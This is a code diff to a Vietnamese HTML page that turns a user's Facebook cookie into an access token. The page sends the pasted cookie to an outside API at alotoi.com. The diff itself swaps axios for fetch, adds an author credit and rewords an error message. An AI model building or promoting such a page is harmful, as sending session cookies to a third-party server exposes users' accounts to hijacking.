@@ -23,6 +23,12 @@
             margin-top: 10px;
             font-weight: bold;
         }
+
+        .author {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
     </style>
 </head>
 <body>
@@ -57,7 +63,9 @@
     <p id="result" class="token-display"></p>
     <button id="copyTokenBtn" class="copy-btn" style="display:none;">Sao chép Token</button>
 
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <!-- Phần hiển thị tác giả -->
+    <p class="author">Tác giả: Hà Mạnh Hùng</p>
+
     <script>
         document.getElementById('cookieForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Ngăn chặn form submit mặc định
@@ -72,10 +80,12 @@
 
             var apiUrl = `https://alotoi.com/fb/?cookie=${encodeURIComponent(cookie)}&type=${encodeURIComponent(tokenType)}`;
 
-            axios.get(apiUrl)
-                .then(response => {
-                    const token = response.data.token;
-                    if (token) {
+            // Gửi yêu cầu đến API bằng fetch
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.token) {
+                        const token = data.token;
                         document.getElementById('result').textContent = 'Token của bạn là: ' + token;
                         document.getElementById('copyTokenBtn').style.display = 'inline-block'; // Hiển thị nút sao chép
                         document.getElementById('copyTokenBtn').setAttribute('data-token', token); // Lưu token vào nút
@@ -86,7 +96,7 @@
                 })
                 .catch(error => {
                     console.error('Lỗi:', error);
-                    document.getElementById('result').textContent = 'Có lỗi xảy ra.';
+                    document.getElementById('result').textContent = 'Có lỗi xảy ra trong quá trình lấy token.';
                     document.getElementById('copyTokenBtn').style.display = 'none';
                 });
         });
